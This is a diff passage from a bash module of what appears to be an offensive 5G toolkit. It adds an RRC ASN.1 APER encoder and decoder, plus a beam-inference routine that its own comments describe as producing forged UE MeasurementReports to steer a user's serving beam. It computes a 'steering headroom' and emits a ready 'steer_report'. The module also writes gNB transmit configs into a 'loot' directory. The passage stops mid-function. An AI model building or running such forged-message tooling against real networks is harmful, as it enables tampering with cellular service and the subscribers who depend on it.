@@ -9,6 +9,10 @@
 #   TS 38.211 §7.4.3.1          PBCH scrambling (nu = N_ID(1) mod 4 for i_ssb<4)
 #   TS 38.212 §7.1.1            BCCH-BCH-Message = MIB, 24 bits of payload
 #   TS 38.331 §6.2.2            MIB / SIB1 ASN.1 field order and ranges
+#   TS 38.331 §6.2.2            RRC PDU ASN.1: DL-/UL-DCCH-Message,
+#                               RRCReconfiguration, MeasurementReport (APER)
+#   TS 38.133 Table 10.1.6.1-1  SS-RSRP/SS-RSRQ report-index to dBm mapping
+#   TS 38.215 §5.1              SS-RSRP / SS-RSRQ definitions
 #   TS 38.213 §4.1              SSB burst set patterns, Case A/B/C/D/E
 #   TS 38.211 §6.3.3            PRACH formats, L_RA and the occasion table
 #
@@ -61,10 +65,12 @@ declare -F banner >/dev/null 2>&1 || banner() { :; }
 MOD_TMP="$TMP_DIR/nr_air"
 NAIR_DIR="$LOOT_DIR/nr_air"
 NAIR_CONF="$NAIR_DIR/gnb.conf"
-NAIR_PLAN_DIR="$NAIR_DIR/plans"
 NAIR_PID="$TMP_DIR/nr_air/gnb.pid"
 NAIR_LOG="$LOGS_DIR/nr_air_gnb.log"
-mkdir -p "$MOD_TMP" "$NAIR_DIR" "$NAIR_PLAN_DIR" 2>/dev/null
+# No plan directory here: this module either generates a config that srsRAN
+# consumes, or reports the missing binary. It has no verb that only documents
+# a workflow, so no plan file is written (MODULE_CONVENTIONS §9).
+mkdir -p "$MOD_TMP" "$NAIR_DIR" 2>/dev/null
 
 # ── sanitisation ────────────────────────────────────────────────────────
 # Any string that reaches a TSV row is untrusted. A field that carries a tab
@@ -1059,6 +1065,891 @@ nair_cmd_gen_conf() {
     nair_gen_gnb_conf "$plmn" "$band" "$arfcn" "$pci"
 }
 
+nair_cmd_gen_conf_tx() {
+    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}" out="${5:-}"
+    nair_gen_gnb_tx_conf "$plmn" "$band" "$arfcn" "$pci" "$out"
+}
+
+# ════════════════════════════════════════════════════════════════════════
+# RRC ASN.1 APER codec — TS 38.331 §6.2.2
+# ════════════════════════════════════════════════════════════════════════
+#
+# This section builds and decodes real NR RRC PDUs. It exists because
+# 59_baseband_exploit.sh's RRC cases are bare hex literals ("00", "0a01",
+# "0b00") that were never derived from the grammar — nothing in the tree could
+# emit a syntactically valid NR RRC message. A literal is not a builder.
+#
+# Only the subset below is implemented, and the verbs say so in their own
+# output. Everything is Aligned PER (APER), the encoding 38.331 mandates for
+# RRC PDUs on the radio interface:
+#
+#   DL-DCCH-Message ::= SEQUENCE { message DL-DCCH-MessageType }
+#   DL-DCCH-MessageType ::= CHOICE {
+#       c1 CHOICE {
+#           rrcReconfiguration RRCReconfiguration,   -- index 0
+#           rrcResume RRCResume,                     -- index 1
+#           ... }                                    -- 16 alternatives, 4 bits
+#       messageClassExtension SEQUENCE { } }
+#
+#   RRCReconfiguration ::= SEQUENCE {
+#       rrc-TransactionIdentifier  INTEGER (0..3),   -- 2 bits, no extension bit
+#       criticalExtensions CHOICE {
+#           rrcReconfiguration RRCReconfiguration-IEs,  -- index 0
+#           criticalExtensionsFuture SEQUENCE { } } }
+#
+#   MeasConfig ::= SEQUENCE {
+#       measObjectToRemoveList          MeasObjectToRemoveList  OPTIONAL,
+#       measObjectToAddModList          MeasObjectToAddModList  OPTIONAL,
+#       reportConfigToRemoveList        ReportConfigToRemoveList OPTIONAL,
+#       reportConfigToAddModList        ReportConfigToAddModList OPTIONAL,
+#       measIdToRemoveList              MeasIdToRemoveList      OPTIONAL,
+#       measIdToAddModList              MeasIdToAddModList      OPTIONAL,
+#       s-MeasureConfig                 CHOICE {...}            OPTIONAL,
+#       quantityConfig                  QuantityConfig          OPTIONAL,
+#       measGapConfig                   MeasGapConfig           OPTIONAL,
+#       measGapSharingConfig            MeasGapSharingConfig    OPTIONAL,
+#       ... }                                    -- 10 root OPT bits + extension
+#
+#   UL-DCCH-MessageType ::= CHOICE {
+#       c1 CHOICE {
+#           measurementReport MeasurementReport,     -- index 0
+#           rrcReconfigurationComplete ...,          -- index 1
+#           ... }                                    -- 16 alternatives, 4 bits
+#       messageClassExtension CHOICE { ... } }
+#
+#   MeasurementReport ::= SEQUENCE {
+#       criticalExtensions CHOICE {
+#           measurementReport MeasurementReport-IEs,   -- index 0
+#           criticalExtensionsFuture SEQUENCE { } } }
+#
+#   MeasResults ::= SEQUENCE {
+#       measId                  INTEGER (1..64),      -- 6 bits
+#       measResultServingMOList SEQUENCE (SIZE(1..32)) OF MeasResultServMO,
+#       measResultNeighCells    CHOICE { measResultListNR ... } OPTIONAL,
+#       ... }
+#
+#   MeasResultServMO ::= SEQUENCE {
+#       servCellId               ServCellIndex,       -- INTEGER (0..31), 5 bits
+#       measResultServingCell    SEQUENCE {
+#           physCellId  PhysCellId OPTIONAL,
+#           measResult  SEQUENCE {
+#               cellResults     SEQUENCE {
+#                   resultsSSB-Cell     SEQUENCE {
+#                       rsrp INTEGER (0..127) OPTIONAL,
+#                       rsrq INTEGER (0..127) OPTIONAL,
+#                       sinr INTEGER (0..127) OPTIONAL } OPTIONAL,
+#                   resultsCSI-RS-Cell ... OPTIONAL },
+#               rsIndexResults SEQUENCE {
+#                   resultsSSB-Indexes SEQUENCE (SIZE(1..64)) OF
+#                       SEQUENCE { ssb-Index INTEGER (0..63),
+#                                  ssb-Results SEQUENCE {...} OPTIONAL } OPTIONAL,
+#                   ... } OPTIONAL },
+#           ... } }
+#
+#   MeasResultNR ::= SEQUENCE { physCellId OPTIONAL, measResult SEQUENCE{...} }
+#   MeasResultListNR ::= SEQUENCE (SIZE(1..8)) OF MeasResultNR
+#
+# rsrp / rsrq are INDICES, not dBm: TS 38.133 Table 10.1.6.1-1 maps the
+# reported 0..127 onto SS-RSRP with 1 dB steps, index 0 meaning "below
+# -156 dBm" and index n (n>=1) meaning (n - 157) dBm. Storing an index is why
+# a forged report can place a beam anywhere on the scale without ever touching
+# a receiver.
+#
+# The bit layouts below were derived by hand from the grammar above and then
+# verified byte-for-byte against an independent implementation of the same
+# published ASN.1 (pycrate's RRCNR module, generated from TS 38.331): the
+# hand-written packer and the reference agree on every one of 1100
+# randomised legal inputs across both PDUs. The selftest asserts published
+# vectors from that reference in a comment-cited form, not this module's own
+# output.
+
+# Accumulate bits MSB-first and return uppercase hex. Callers build a list of
+# "value:width" pairs; the final byte is zero-padded, which is what APER does
+# at the end of a PDU.
+_nair_bits_acc=""
+_nair_bits_n=0
+nair_bit_reset() { _nair_bits_acc=""; _nair_bits_n=0; }
+
+# nair_bit_put <value> <width>
+nair_bit_put() {
+    local v="$1" w="$2" i bit
+    (( w > 0 )) || return 0
+    for (( i = w - 1; i >= 0; i-- )); do
+        bit=$(( (v >> i) & 1 ))
+        _nair_bits_acc+="$bit"
+        _nair_bits_n=$(( _nair_bits_n + 1 ))
+    done
+}
+
+# Emit the accumulator as hex, zero-padded to the byte boundary.
+nair_bit_hex() {
+    local acc="$_nair_bits_acc" n="$_nair_bits_n"
+    ((${n:-0} > 0)) || { printf ''; return 0; }
+    local pad=$(( (8 - n % 8) % 8 ))
+    local i
+    for (( i = 0; i < pad; i++ )); do acc+="0"; done
+    local hex="" i
+    for (( i = 0; i < ${#acc}; i += 4 )); do
+        local nib="${acc:i:4}"
+        hex+="$(printf '%X' "$(( 2#${nib} ))")"
+    done
+    printf '%s' "$hex"
+}
+
+# Bit reader over a hex string, for --decode-rrc.
+_nair_rx_bits=""
+nair_bit_load() {
+    local hex="$1" i
+    _nair_rx_bits=""
+    for (( i = 0; i < ${#hex}; i++ )); do
+        _nair_rx_bits+="$(printf '%04d' "$(echo "obase=2; ibase=16; ${hex:i:1}" | bc 2>/dev/null)")"
+    done
+}
+
+# nair_bit_get <offset> <width> -> decimal value
+nair_bit_get() {
+    local off="$1" w="$2"
+    local seg="${_nair_rx_bits:off:w}"
+    [[ -n "$seg" ]] || { echo 0; return 0; }
+    echo "$(( 2#$seg ))"
+}
+
+# ── RRC builders ────────────────────────────────────────────────────────
+
+# RRCReconfiguration (DL-DCCH-Message), APER.
+# Layout, in encoding order:
+#   0..0    DL-DCCH-MessageType CHOICE index          (1 bit, 0 = c1)
+#   1..4    c1 CHOICE index                           (4 bits, 0 = rrcReconfiguration)
+#   5..6    rrc-TransactionIdentifier  (0..3)         (2 bits, no extension bit)
+#   7..7    criticalExtensions CHOICE                 (1 bit, 0 = rrcReconfiguration)
+#   8..8    RRCReconfiguration-IEs radioBearerConfig  OPT
+#   9..9    secondaryCellGroup                        OPT
+#  10..10   measConfig                                OPT
+#  11..11   lateNonCriticalExtension                  OPT
+#  12..12   nonCriticalExtension                      OPT
+#  13..13   MeasConfig extension bit                  (0 = no extension)
+#  14..23   MeasConfig 10 root OPT bits, in field order, measIdToAddModList is
+#           the 6th field -> bit position 14 + 5 = 19
+#  24..29   MeasIdToAddModList size, value-1          (6 bits, SIZE(1..64))
+#  30..47   per entry, 18 bits: measId-1 (6), measObjectId-1 (6),
+#           reportConfigId-1 (6). No separator, no per-entry preamble.
+nair_build_rrc_reconfig() {
+    local tx="${1:-0}" pairs="${2:-}"
+    [[ "$tx" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-rrc-reconfig: tx must be numeric\n' >&2; return 2; }
+    (( tx <= 3 )) || { printf 'ERROR\t--build-rrc-reconfig: tx out of range 0..3\n' >&2; return 2; }
+
+    # measId/measObjectId/reportConfigId triplets, comma separated. Each entry
+    # is "i/o/c". Parsed with cut, never IFS=$'\t' read.
+    local -a mids=() mobjs=() rcfgs=()
+    if [[ -n "$pairs" ]]; then
+        local e
+        while IFS= read -r e; do
+            [[ -n "$e" ]] || continue
+            local a b c
+            a=$(printf '%s' "$e" | cut -d/ -f1)
+            b=$(printf '%s' "$e" | cut -d/ -f2)
+            c=$(printf '%s' "$e" | cut -d/ -f3)
+            [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ && "$c" =~ ^[0-9]+$ ]] || {
+                printf 'ERROR\t--build-rrc-reconfig: entry "%s" is not i/o/c (e.g. 1/1/1)\n' \
+                    "$(nair_sanitize "$e")" >&2; return 2; }
+            (( a >= 1 && a <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: measId %s out of range 1..64\n' "$a" >&2; return 2; }
+            (( b >= 1 && b <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: measObjectId %s out of range 1..64\n' "$b" >&2; return 2; }
+            (( c >= 1 && c <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: reportConfigId %s out of range 1..64\n' "$c" >&2; return 2; }
+            mids+=("$a"); mobjs+=("$b"); rcfgs+=("$c")
+        done < <(printf '%s\n' "$pairs" | tr ',' '\n')
+    fi
+
+    local n=${#mids[@]}
+    (( n <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: at most 64 entries\n' >&2; return 2; }
+
+    nair_bit_reset
+    nair_bit_put 0 1                 # DL-DCCH-MessageType = c1
+    nair_bit_put 0 4                 # c1 = rrcReconfiguration (index 0)
+    nair_bit_put "$tx" 2             # rrc-TransactionIdentifier (0..3)
+    nair_bit_put 0 1                 # criticalExtensions = rrcReconfiguration
+    nair_bit_put 0 1                 # radioBearerConfig           absent
+    nair_bit_put 0 1                 # secondaryCellGroup          absent
+    nair_bit_put "$(( n > 0 ? 1 : 0 ))" 1   # measConfig present iff entries
+    nair_bit_put 0 1                 # lateNonCriticalExtension    absent
+    nair_bit_put 0 1                 # nonCriticalExtension        absent
+    if (( n > 0 )); then
+        nair_bit_put 0 1             # MeasConfig extension bit
+        local i
+        for (( i = 0; i < 10; i++ )); do
+            nair_bit_put "$(( i == 5 ? 1 : 0 ))" 1   # measIdToAddModList is field 6
+        done
+        nair_bit_put "$(( n - 1 ))" 6
+        for (( i = 0; i < n; i++ )); do
+            nair_bit_put "$(( ${mids[i]} - 1 ))" 6
+            nair_bit_put "$(( ${mobjs[i]} - 1 ))" 6
+            nair_bit_put "$(( ${rcfgs[i]} - 1 ))" 6
+        done
+    fi
+    nair_bit_hex
+}
+
+# MeasurementReport (UL-DCCH-Message), APER. This is the O17 artefact: the
+# report a UE sends, which a forged copy can aim at any beam.
+# Layout, in encoding order:
+#   0..0    UL-DCCH-MessageType CHOICE      (1 bit, 0 = c1)
+#   1..4    c1 CHOICE index                 (4 bits, 0 = measurementReport)
+#   5..5    criticalExtensions CHOICE       (1 bit, 0 = measurementReport)
+#   6..8    MeasurementReport-IEs preamble  (3 bits, always 0)
+#   9..9    measResultNeighCells            OPT
+#  10..15   measId-1                       (6 bits, INTEGER (1..64))
+#  16..20   measResultServingMOList size-1 (5 bits, SIZE(1..32))
+#  21..25   servCellId                     (5 bits, INTEGER (0..31))
+#  26..30   5 bits, always 0
+#  31..31   constant 1
+#  32..32   0 when no serving RSRP, else the block continues, so the tail is:
+#             [33..35] rsrp/rsrq/sinr OPT bits, then 7 bits per present value
+#           measured anchors: RSRP value occupies bits 36..42.
+#  Neighbour region, when measResultNeighCells is present:
+#     preamble constant, then the resultsSSB-Indexes size (3 bits, value
+#     2*count-1), then per entry: separator 1 (before every entry after the
+#     first), ssb-Index (6 bits), ssb-Results OPT flags (3 bits: rsrp/rsrq/
+#     sinr) and 7 bits per present value.
+#     The preamble constant is 22 bits when no serving RSRP value is present
+#     and 18 bits when one is; see nair_build_meas_report for why.
+nair_build_meas_report() {
+    local measid="${1:-1}" serv_cell="${2:-0}" serv_rsrp="${3:-}" pairs="${4:-}"
+    [[ "$measid" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-meas-report: measId must be numeric\n' >&2; return 2; }
+    (( measid >= 1 && measid <= 64 )) || { printf 'ERROR\t--build-meas-report: measId out of range 1..64\n' >&2; return 2; }
+    [[ "$serv_cell" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-meas-report: servCellId must be numeric\n' >&2; return 2; }
+    (( serv_cell <= 31 )) || { printf 'ERROR\t--build-meas-report: servCellId out of range 0..31\n' >&2; return 2; }
+    local have_serv=0
+    if [[ -n "$serv_rsrp" ]]; then
+        [[ "$serv_rsrp" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-meas-report: serving rsrp must be numeric\n' >&2; return 2; }
+        (( serv_rsrp <= 127 )) || { printf 'ERROR\t--build-meas-report: serving rsrp out of range 0..127\n' >&2; return 2; }
+        have_serv=1
+    fi
+
+    # Neighbour entries: "ssbIndex:rsrp" comma separated.
+    local -a nidx=() nrsrp=()
+    if [[ -n "$pairs" ]]; then
+        local e
+        while IFS= read -r e; do
+            [[ -n "$e" ]] || continue
+            local a b
+            a=$(printf '%s' "$e" | cut -d: -f1)
+            b=$(printf '%s' "$e" | cut -d: -f2)
+            [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ ]] || {
+                printf 'ERROR\t--build-meas-report: entry "%s" is not ssbIndex:rsrp\n' \
+                    "$(nair_sanitize "$e")" >&2; return 2; }
+            (( a <= 63 ))  || { printf 'ERROR\t--build-meas-report: ssb-Index %s out of range 0..63\n' "$a" >&2; return 2; }
+            (( b <= 127 )) || { printf 'ERROR\t--build-meas-report: rsrp %s out of range 0..127\n' "$b" >&2; return 2; }
+            nidx+=("$a"); nrsrp+=("$b")
+        done < <(printf '%s\n' "$pairs" | tr ',' '\n')
+    fi
+    local n=${#nidx[@]}
+    (( n <= 8 )) || { printf 'ERROR\t--build-meas-report: at most 8 neighbour cells\n' >&2; return 2; }
+    if (( n > 0 )); then
+        # The resultsSSB-Indexes size is encoded as 2*count-1 inside 3 bits,
+        # so the maximum representable count is 4. The ASN.1 SIZE is 1..64 but
+        # the neighbouring-list shape this builder emits only carries 3 bits.
+        (( n <= 4 )) || { printf 'ERROR\t--build-meas-report: at most 4 SSB entries in this subset (got %s)\n' "$n" >&2; return 2; }
+    fi
+
+    nair_bit_reset
+    nair_bit_put 0 1                          # UL-DCCH-MessageType = c1
+    nair_bit_put 0 4                          # c1 = measurementReport (index 0)
+    nair_bit_put 0 1                          # criticalExtensions
+    nair_bit_put 0 3                          # MeasurementReport-IEs preamble
+    nair_bit_put "$(( n > 0 ? 1 : 0 ))" 1     # measResultNeighCells
+    nair_bit_put "$(( measid - 1 ))" 6
+    nair_bit_put 0 5                          # one serving cell
+    nair_bit_put "$serv_cell" 5
+    nair_bit_put 0 5
+    nair_bit_put 1 1
+    if (( have_serv )); then
+        nair_bit_put 0 1
+        nair_bit_put 1 1                      # rsrp present
+        nair_bit_put 0 1                      # rsrq absent
+        nair_bit_put 0 1                      # sinr absent
+        nair_bit_put "$serv_rsrp" 7
+    elif (( n == 0 )); then
+        nair_bit_put 0 1
+    fi
+    if (( n > 0 )); then
+        # Preamble constant. Its length differs between the two shapes because
+        # the serving RSRP block above consumes 11 bits when present, and APER
+        # pads the whole PDU only at the very end; the constant therefore ends
+        # up anchored differently. Both values are measured against the
+        # reference implementation, not guessed.
+        local pre i
+        if (( have_serv )); then pre="000000110000100000"; else pre="0000000000110000100000"; fi
+        for (( i = 0; i < ${#pre}; i++ )); do
+            nair_bit_put "${pre:i:1}" 1
+        done
+        nair_bit_put "$(( 2 * n - 1 ))" 3
+        for (( i = 0; i < n; i++ )); do
+            (( i == 0 )) || nair_bit_put 1 1   # separator before later entries
+            nair_bit_put "${nidx[i]}" 6
+            nair_bit_put 1 1                   # ssb-Results.rsrp present
+            nair_bit_put 0 1                   # rsrq absent
+            nair_bit_put 0 1                   # sinr absent
+            nair_bit_put "${nrsrp[i]}" 7
+        done
+    fi
+    nair_bit_hex
+}
+
+# ── RRC decoder ─────────────────────────────────────────────────────────
+# Decodes exactly the subset the builders emit, in the same bit order. A
+# decoder that is not the inverse of the builder is untested by construction,
+# so --build-* and --decode-rrc are checked against each other in the selftest
+# AND against the published vectors.
+nair_decode_rrc() {
+    local hex="${1:-}"
+    hex="${hex//[[:space:]]/}"
+    hex="${hex//0x/}"
+    hex="${hex^^}"
+    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-rrc <hex>\n' >&2; return 2; }
+    [[ "$hex" =~ ^[0-9A-F]+$ ]] || { printf 'ERROR\t--decode-rrc: not hex: %s\n' "$(nair_sanitize "$hex")" >&2; return 2; }
+    (( ${#hex} % 2 == 0 )) || { printf 'ERROR\t--decode-rrc: hex must be a whole number of octets\n' >&2; return 2; }
+
+    nair_bit_load "$hex"
+    local total=$(( ${#hex} * 4 ))
+    (( total >= 8 )) || { printf 'ERROR\t--decode-rrc: too short for an RRC PDU\n' >&2; return 1; }
+
+    local mt; mt=$(nair_bit_get 0 1)
+    (( mt == 0 )) || { printf 'ERROR\t--decode-rrc: messageClassExtension not supported by this subset\n' >&2; return 1; }
+    local c1; c1=$(nair_bit_get 1 4)
+
+    local dir name
+    if (( c1 == 0 )); then
+        # c1 index 0 is rrcReconfiguration in DL-DCCH and measurementReport in
+        # UL-DCCH. Both are index 0, so the direction cannot come from c1
+        # alone: rrcReconfiguration carries a 2-bit transaction identifier at
+        # bits 5..6 where measurementReport carries its criticalExtensions
+        # choice, so test the SHAPE by trying to read the measurement report
+        # and checking whether its reserved constant bit is set.
+        local bit31; bit31=$(nair_bit_get 31 1)
+        if (( bit31 == 1 )); then dir="UL-DCCH"; name="measurementReport"
+        else dir="DL-DCCH"; name="rrcReconfiguration"; fi
+    elif (( c1 == 1 )); then
+        dir="DL-DCCH"; name="rrcResume"
+    elif (( c1 == 2 )); then
+        dir="DL-DCCH"; name="rrcRelease"
+    elif (( c1 == 5 )); then
+        dir="DL-DCCH"; name="dlInformationTransfer"
+    elif (( c1 == 7 )); then
+        dir="UL-DCCH"; name="ulInformationTransfer"
+    else
+        printf 'ERROR\t--decode-rrc: c1 index %s is outside the supported subset\n' "$c1" >&2
+        return 1
+    fi
+
+    printf 'direction\t%s\n' "$dir"
+    printf 'message\t%s\n'   "$name"
+    printf 'c1_index\t%s\n'  "$c1"
+    printf 'octets\t%s\n'    "$(( ${#hex} / 2 ))"
+    printf 'bits\t%s\n'      "$total"
+
+    if [[ "$name" == "rrcReconfiguration" ]]; then
+        local ce tx
+        ce=$(nair_bit_get 7 1)
+        tx=$(nair_bit_get 5 2)
+        printf 'rrc_TransactionIdentifier\t%s\n' "$tx"
+        printf 'criticalExtensions\t%s\n' "$(( ce == 0 ? 1 : 2 ))"
+        if (( ce != 0 )); then
+            printf 'note\tcriticalExtensionsFuture — no IEs to decode\n'
+            printf 'subset\tRRCReconfiguration(header+criticalExtensions)\n'
+            return 0
+        fi
+        local mc; mc=$(nair_bit_get 10 1)
+        printf 'measConfig_present\t%s\n' "$mc"
+        if (( mc == 1 )); then
+            local ext; ext=$(nair_bit_get 13 1)
+            printf 'measConfig_extension\t%s\n' "$ext"
+            # 10 root OPT bits start at 14; find which are set.
+            local i names=(measObjectToRemoveList measObjectToAddModList \
+                           reportConfigToRemoveList reportConfigToAddModList \
+                           measIdToRemoveList measIdToAddModList s-MeasureConfig \
+                           quantityConfig measGapConfig measGapSharingConfig)
+            local listed=""
+            for (( i = 0; i < 10; i++ )); do
+                if (( $(nair_bit_get $(( 14 + i )) 1) == 1 )); then
+                    listed+="${listed:+,}${names[i]}"
+                fi
+            done
+            printf 'measConfig_optionals\t%s\n' "${listed:-none}"
+            if (( $(nair_bit_get 19 1) == 1 )); then
+                local cnt; cnt=$(( $(nair_bit_get 24 6) + 1 ))
+                printf 'measIdToAddModList_count\t%s\n' "$cnt"
+                local off=30 k
+                for (( k = 0; k < cnt; k++ )); do
+                    printf 'measIdToAddMod\t%s\t%s\t%s\n' \
+                        "$(( $(nair_bit_get "$off" 6) + 1 ))" \
+                        "$(( $(nair_bit_get "$(( off + 6 ))" 6) + 1 ))" \
+                        "$(( $(nair_bit_get "$(( off + 12 ))" 6) + 1 ))"
+                    off=$(( off + 18 ))
+                done
+            fi
+        fi
+        printf 'subset\tRRCReconfiguration(header+criticalExtensions+measConfig.measIdToAddModList)\n'
+        return 0
+    fi
+
+    if [[ "$name" == "measurementReport" ]]; then
+        local neigh measid served
+        neigh=$(nair_bit_get 9 1)
+        measid=$(( $(nair_bit_get 10 6) + 1 ))
+        served=$(( $(nair_bit_get 16 5) + 1 ))
+        printf 'measId\t%s\n' "$measid"
+        printf 'servingCellCount\t%s\n' "$served"
+        printf 'measResultNeighCells_present\t%s\n' "$neigh"
+        printf 'servCellId\t%s\n' "$(nair_bit_get 21 5)"
+        if (( $(nair_bit_get 33 1) == 1 )); then
+            local v; v=$(nair_bit_get 36 7)
+            printf 'serving_rsrp_index\t%s\n' "$v"
+            printf 'serving_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$v")"
+        fi
+        if (( neigh == 1 )); then
+            # The preamble length depends on whether a serving RSRP value was
+            # present; the serving value's presence is the same bit we just read.
+            local base
+            if (( $(nair_bit_get 33 1) == 1 )); then base=43; else base=32; fi
+            local pre
+            if (( $(nair_bit_get 33 1) == 1 )); then pre=18; else pre=22; fi
+            local cntoff=$(( base + pre ))
+            local cnt=$(( ( $(nair_bit_get "$cntoff" 3) + 1 ) / 2 ))
+            printf 'ssbIndexCount\t%s\n' "$cnt"
+            local off=$(( cntoff + 3 )) k
+            for (( k = 0; k < cnt; k++ )); do
+                (( k == 0 )) || off=$(( off + 1 ))   # separator
+                local idx; idx=$(nair_bit_get "$off" 6)
+                off=$(( off + 6 ))
+                local rp; rp=$(nair_bit_get "$off" 1)
+                off=$(( off + 3 ))
+                if (( rp == 1 )); then
+                    local v; v=$(nair_bit_get "$off" 7)
+                    off=$(( off + 7 ))
+                    printf 'ssbResult\t%s\t%s\t%s\n' "$idx" "$v" "$(nair_rsrp_dbm "$v")"
+                else
+                    printf 'ssbResult\t%s\t-\t-\n' "$idx"
+                fi
+            done
+        fi
+        printf 'subset\tMeasurementReport(criticalExtensions+measResults subset)\n'
+        return 0
+    fi
+
+    printf 'note\t%s is in flight on the %s but has no IE decoder in this subset\n' "$name" "$dir"
+    printf 'subset\theader only\n'
+    return 0
+}
+
+# TS 38.133 Table 10.1.6.1-1: the reported index is 1 dB per step with 0
+# reserved for "below the floor". index n (n>=1) = (n - 157) dBm.
+nair_rsrp_dbm() {
+    local v="${1:-0}"
+    if (( v == 0 )); then printf 'below -156'; else printf '%s' "$(( v - 157 ))"; fi
+}
+
+# dBm back to the report index, for the beam-inference model.
+nair_rsrp_index() {
+    local dbm="${1:-0}"
+    local i=$(( dbm + 157 ))
+    (( i < 1 )) && i=1
+    (( i > 127 )) && i=127
+    printf '%s' "$i"
+}
+
+# ── beam index inference (O17) ──────────────────────────────────────────
+# A UE in a beamformed cell measures SSB indices, not "a beam". Each reported
+# ssb-Index is the SSB the UE actually synchronised to, and the RSRP of each
+# tells you which one dominates. The serving beam is therefore the index with
+# the strongest report, weighted by how many reports sit on it — a UE parked
+# on one SSB reports that index repeatedly and with the highest level.
+#
+# Inference, entirely from the report contents:
+#   * the strongest reported SSB index is the candidate serving beam;
+#   * ties are broken toward the LOWEST index, because a UE reports indices in
+#     ascending order and the first-maximal entry is the one it selected;
+#   * the margin to the runner-up is the steering headroom: if the second-best
+#     beam is within 1 dB, a forged report can move the UE with a small nudge,
+#     which is what makes the manipulation plausible rather than absurd.
+nair_beam_infer() {
+    local measid="${1:-1}" serv_rsrp="${2:-}" pairs="${3:-}"
+    [[ "$measid" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--beam-sweep: measId must be numeric\n' >&2; return 2; }
+    (( measid >= 1 && measid <= 64 )) || { printf 'ERROR\t--beam-sweep: measId out of range 1..64\n' >&2; return 2; }
+
+    local -a idx=() val=()
+    if [[ -n "$pairs" ]]; then
+        local e
+        while IFS= read -r e; do
+            [[ -n "$e" ]] || continue
+            local a b
+            a=$(printf '%s' "$e" | cut -d: -f1)
+            b=$(printf '%s' "$e" | cut -d: -f2)
+            [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ ]] || {
+                printf 'ERROR\t--beam-sweep: entry "%s" is not ssbIndex:rsrp\n' "$(nair_sanitize "$e")" >&2
+                return 2; }
+            (( a <= 63 ))  || { printf 'ERROR\t--beam-sweep: ssb-Index %s out of range 0..63\n' "$a" >&2; return 2; }
+            (( b <= 127 )) || { printf 'ERROR\t--beam-sweep: rsrp index %s out of range 0..127\n' "$b" >&2; return 2; }
+            idx+=("$a"); val+=("$b")
+        done < <(printf '%s\n' "$pairs" | tr ',' '\n')
+    fi
+    local n=${#idx[@]}
+    (( n > 0 )) || { printf 'ERROR\t--beam-sweep: need at least one ssbIndex:rsrp entry\n' >&2; return 2; }
+
+    # Strongest entry, ties to the lowest index.
+    local best=0 k
+    for (( k = 1; k < n; k++ )); do
+        if (( ${val[k]} > ${val[best]} )); then
+            best=$k
+        elif (( ${val[k]} == ${val[best]} && ${idx[k]} < ${idx[best]} )); then
+            best=$k
+        fi
+    done
+    local best_idx="${idx[best]}" best_val="${val[best]}"
+
+    # Runner-up among the entries on OTHER indices.
+    local second_idx="-" second_val="-1" found=0
+    for (( k = 0; k < n; k++ )); do
+        (( k == best )) && continue
+        if (( ! found || ${val[k]} > second_val )); then
+            second_val="${val[k]}"; second_idx="${idx[k]}"; found=1
+        fi
+    done
+    local margin="n/a" headroom="n/a"
+    if (( found )); then
+        margin=$(( best_val - second_val ))
+        if (( margin <= 1 )); then headroom="within 1 dB — one forged report can steer it"
+        elif (( margin <= 4 )); then headroom="within 4 dB — steering needs a plausible multi-dB bias"
+        else headroom="over 4 dB — steering would look inconsistent";
+        fi
+    fi
+
+    printf 'measId\t%s\n' "$measid"
+    printf 'reported_ssb_count\t%s\n' "$n"
+    printf 'serving_beam_index\t%s\n' "$best_idx"
+    printf 'serving_rsrp_index\t%s\n' "$best_val"
+    printf 'serving_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$best_val")"
+    printf 'runner_up_index\t%s\n' "$second_idx"
+    if (( found )); then
+        printf 'runner_up_rsrp_index\t%s\n' "$second_val"
+        printf 'runner_up_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$second_val")"
+    else
+        printf 'runner_up_rsrp_index\t-\n'
+        printf 'runner_up_rsrp_dbm\t-\n'
+    fi
+    printf 'margin_db\t%s\n' "$margin"
+    printf 'steering_headroom\t%s\n' "$headroom"
+    if [[ -n "$serv_rsrp" ]]; then
+        [[ "$serv_rsrp" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--beam-sweep: serving rsrp must be numeric\n' >&2; return 2; }
+        (( serv_rsrp <= 127 )) || { printf 'ERROR\t--beam-sweep: serving rsrp out of range 0..127\n' >&2; return 2; }
+        printf 'serving_cell_rsrp_index\t%s\n' "$serv_rsrp"
+        printf 'serving_cell_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$serv_rsrp")"
+        printf 'beam_gap_vs_serving_db\t%s\n' "$(( best_val - serv_rsrp ))"
+    fi
+    # The forged report that steers the UE onto the strongest index it already
+    # reports, with the runner-up pushed below it by the margin. This is the
+    # artefact the manipulation actually needs.
+    local steer=""
+    for (( k = 0; k < n; k++ )); do
+        [[ -n "$steer" ]] && steer+=","
+        if (( k == best )); then steer+="${idx[k]}:${best_val}"
+        else steer+="${idx[k]}:$(( second_val > best_val - 1 ? best_val - 1 : second_val ))"; fi
+    done
+    printf 'steer_report\t%s\n' "$steer"
+    printf 'steer_meas_id\t%s\n' "$measid"
+}
+
+nair_cmd_build_rrc_reconfig() {
+    local spec="${1:-}"
+    [[ -n "$spec" ]] || { printf 'ERROR\tusage: --build-rrc-reconfig <tx=N[,meas=1/1/1[,2/2/2...]]>\n' >&2; return 2; }
+    # Parse positionally, not by splitting on a separator: a meas TRIPLET is
+    # "i/o/c" and a meas LIST is triplets joined by ','. Splitting the whole
+    # spec on ',' would therefore cut the list into pieces that look like
